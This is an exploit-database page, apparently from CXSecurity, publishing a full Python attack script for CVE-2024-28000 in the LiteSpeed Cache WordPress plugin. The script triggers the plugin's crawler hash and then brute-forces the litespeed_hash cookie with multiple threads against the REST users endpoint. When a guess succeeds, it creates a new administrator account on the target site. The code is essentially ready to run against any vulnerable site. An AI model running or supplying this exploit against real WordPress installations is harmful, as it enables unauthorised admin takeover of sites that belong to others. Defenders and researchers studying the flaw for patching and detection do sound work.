---
title: Litespeed Cache WordPress Plugin 6.3.0.1 Privilege Escalation
url: https://cxsecurity.com/issue/WLB-2025060027
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2025-06-27
fetch_date: 2025-10-06T22:47:51.161068
---

# Litespeed Cache WordPress Plugin 6.3.0.1 Privilege Escalation

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Litespeed Cache WordPress Plugin 6.3.0.1 Privilege Escalation** **2025.06.26**  Credit:  **[Milad Karimi](https://cxsecurity.com/author/Milad%2BKarimi/1/)**  Risk: **Medium**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2024-28000](https://cxsecurity.com/cveshow/CVE-2024-28000/ "Click to see CVE-2024-28000")**  CWE: **[CWE-264](https://cxsecurity.com/cwe/CWE-264 "Click to see CWE-264")** | |

# Exploit Title: Litespeed Cache WordPress Plugin 6.3.0.1 - Privilege Escalation
# Date: 2025-06-10
# Exploit Author: Milad Karimi (Ex3ptionaL)
# Contact: miladgrayhat@gmail.com
# Zone-H: www.zone-h.org/archive/notifier=Ex3ptionaL
# Country: United Kingdom
# CVE : CVE-2024-28000
import requests
import random
import string
import concurrent.futures
# Configuration
target\_url = 'http://example.com'
rest\_api\_endpoint = '/wp-json/wp/v2/users'
ajax\_endpoint = '/wp-admin/admin-ajax.php'
admin\_user\_id = '1'
num\_hash\_attempts = 1000000
num\_workers = 10
new\_username = 'newadminuser' # Replace with desired username
new\_user\_password = 'NewAdminPassword123!' # Replace with a secure password
def mt\_srand(seed=None):
"""
Mimics PHP's mt\_srand function by setting the seed for random number
generation.
"""
random.seed(seed)
def mt\_rand(min\_value=0, max\_value=2\*\*32 - 1):
"""
Mimics PHP's mt\_rand function by generating a random number within the
specified range.
"""
return random.randint(min\_value, max\_value)
def generate\_random\_string(length=6):
"""
Generates a random string based on the output of mt\_rand.
"""
chars = string.ascii\_letters + string.digits
return ''.join(random.choices(chars, k=length))
def trigger\_hash\_generation():
payload = {
'action': 'async\_litespeed',
'litespeed\_type': 'crawler'
}
try:
response = requests.post(f'{target\_url}{ajax\_endpoint}',
data=payload)
if response.status\_code == 200:
print('[INFO] Triggered hash generation.')
else:
print(f'[ERROR] Failed to trigger hash generation - Status
code: {response.status\_code}')
except requests.RequestException as e:
print(f'[ERROR] AJAX request failed: {e}')
def attempt\_hash(hash\_value):
cookies = {
'litespeed\_hash': hash\_value,
'litespeed\_role': admin\_user\_id
}
try:
response = requests.post(f'{target\_url}{rest\_api\_endpoint}',
cookies=cookies)
return response, cookies
except requests.RequestException as e:
print(f'[ERROR] Request failed: {e}')
return None, None
def create\_admin\_user(cookies):
user\_data = {
'username': new\_username,
'password': new\_user\_password,
'email': f'{new\_username}@example.com',
'roles': ['administrator']
}
try:
response = requests.post(f'{target\_url}{rest\_api\_endpoint}',
cookies=cookies, json=user\_data)
if response.status\_code == 201:
print(f'[SUCCESS] New admin user "{new\_username}" created
successfully!')
else:
print(f'[ERROR] Failed to create admin user - Status code:
{response.status\_code} - Response: {response.text}')
except requests.RequestException as e:
print(f'[ERROR] User creation request failed: {e}')
def worker():
for \_ in range(num\_hash\_attempts // num\_workers):
random\_string = generate\_random\_string()
print(f'[DEBUG] Trying hash: {random\_string}')
response, cookies = attempt\_hash(random\_string)
if response is None:
continue
print(f'[DEBUG] Response status code: {response.status\_code}')
print(f'[DEBUG] Response content: {response.text}')
if response.status\_code == 201:
print(f'[SUCCESS] Valid hash found: {random\_string}')
create\_admin\_user(cookies)
return
elif response.status\_code == 401:
print(f'[FAIL] Invalid hash: {random\_string}')
else:
print(f'[ERROR] Unexpected response for hash: {random\_string} -
Status code: {response.status\_code}')
def main():
# Seeding the random number generator (mimicking mt\_srand)
mt\_srand()
trigger\_hash\_generation()
with concurrent.futures.ThreadPoolExecutor(max\_workers=num\_workers) as
executor:
futures = [executor.submit(worker) for \_ in range(num\_workers)]
concurrent.futures.wait(futures)
if \_\_name\_\_ == '\_\_main\_\_':
main()

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2025060027)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 -1

0%

100%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top